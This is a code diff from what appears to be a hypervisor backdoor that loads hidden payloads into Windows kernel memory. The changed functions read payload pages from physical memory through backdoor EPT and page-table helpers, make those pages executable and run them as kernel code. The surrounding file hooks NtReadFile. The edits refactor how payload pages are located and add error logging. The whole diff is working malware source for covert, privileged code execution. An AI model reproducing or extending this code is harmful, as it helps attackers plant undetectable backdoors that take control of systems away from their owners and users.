@@ -134,9 +134,9 @@ BOOLEAN PayloadMakeExecutable(uint64_t EptAddr, PVOID Mem, ULONG MemSize)
         uint64_t Addr = (uint64_t)RVATOVA(Mem, PAGE_SIZE * i);
 
         // make page executable
-        if (backdoor_modify_pt(HVBD_MEM_WRITEABLE | HVBD_MEM_EXECUTABLE, Addr, m_Params.Cr3, EptAddr) != 0)
+        if (backdoor_modify_pt(HVBD_MEM_WRITEABLE | HVBD_MEM_EXECUTABLE, Addr, cr3_get(), EptAddr) != 0)
         {
-            DbgMsg(__FILE__, __LINE__, "ERROR: backdoor_make_exec_pt() fails\n");
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: backdoor_make_exec_pt() fails\n");
             return FALSE;
         }
     }
@@ -179,9 +179,6 @@ PVOID PayloadRun(uint64_t EptAddr)
     PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
         RVATOVA(m_Params.DriverBase, ((PIMAGE_DOS_HEADER)m_Params.DriverBase)->e_lfanew);
 
-    // payload physical pages map is located at the end of the driver image
-    uint64_t *PagesMap = (uint64_t *)RVATOVA(m_Params.DriverBase, pHeaders->OptionalHeader.SizeOfImage);        
-
     // allocate memory for the payload data
     ULONG DataSize = m_Params.PayloadPagesCount * PAGE_SIZE;
     PVOID Data = I_ExAllocatePool(NonPagedPool, DataSize);
@@ -192,9 +189,19 @@ PVOID PayloadRun(uint64_t EptAddr)
 
     for (ULONG i = 0; i < m_Params.PayloadPagesCount; i += 1)
     {
-        // read payload page from the physical memory
-        if (backdoor_phys_read(PagesMap[i], RVATOVA(Data, PAGE_SIZE * i), PAGE_SIZE) != 0)
+        uint64_t PhysAddr = 0, Addr = (uint64_t)m_Params.PayloadBase + (PAGE_SIZE * i);
+
+        // get physical address of the payload page
+        if (backdoor_virt_translate(Addr, &PhysAddr, m_Params.PayloadCr3, m_Params.PayloadEpt) != 0)
         {
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: backdoor_virt_translate() fails\n");
+            goto _end;
+        }
+
+        // read payload page from the physical memory
+        if (backdoor_phys_read(PhysAddr, RVATOVA(Data, PAGE_SIZE * i), PAGE_SIZE) != 0)
+        {
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: backdoor_phys_read() fails\n");
             goto _end;
         }        
     }
@@ -298,7 +305,7 @@ void DriverMain(void)
     uint64_t InfoAddr = 0, EptAddr = 0;
     uint32_t Val = 0;
 
-    lock_aquire(DRIVER_LOCK_ADDR);
+    lock_aquire();
 
     // get call counter address
     if (backdoor_ept_info_addr(&InfoAddr) == 0)
@@ -319,18 +326,18 @@ void DriverMain(void)
                 {
                     DbgMsg(
                         __FILE__, __LINE__, __FUNCTION__"(): CR3 = 0x%llx, EPT is at 0x%llx\n", 
-                        m_Params.Cr3, EptAddr
+                        cr3_get(), EptAddr
                     );
 
-                    if (m_Params.bAllocOnly)
-                    {
-                        // just allocate kernel memoty for the payload
-                        ImageAddr = PayloadAlloc(EptAddr);
-                    }
-                    else
+                    if (m_Params.PayloadBase != NULL)
                     {
                         // load and execute payload
                         ImageAddr = PayloadRun(EptAddr);
+                    }
+                    else
+                    {
+                        // just allocate kernel memoty for the payload
+                        ImageAddr = PayloadAlloc(EptAddr);                        
                     }
                 }                
 
@@ -345,7 +352,7 @@ void DriverMain(void)
         }
     }
 
-    lock_release(DRIVER_LOCK_ADDR);
+    lock_release();
 }
 //--------------------------------------------------------------------------------------
 NTSTATUS NTAPI new_NtReadFile(
